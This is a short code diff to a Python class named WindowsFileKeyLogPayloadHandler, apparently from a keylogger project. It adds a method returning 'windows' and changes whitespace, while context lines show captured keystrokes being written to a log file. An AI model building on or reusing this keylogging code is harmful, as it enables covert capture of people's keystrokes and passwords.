@@ -12,7 +12,8 @@ from utils.debug_error_handler import ErrorLogHandler
 error_logger= ErrorLogHandler()
 
 class WindowsFileKeyLogPayloadHandler(AbstractPayloadHandler):
-    
+
+
 	def write_to_file(self,data):
 		with open(self.log_file,"a") as infile:
 			infile.write(data)
@@ -48,3 +49,7 @@ class WindowsFileKeyLogPayloadHandler(AbstractPayloadHandler):
 			self.write_to_file(sp_keys[a])
 		else:
 			self.write_to_file(chr(a))
+			
+	@classmethod
+	def get_platform(cls):
+		return "windows"
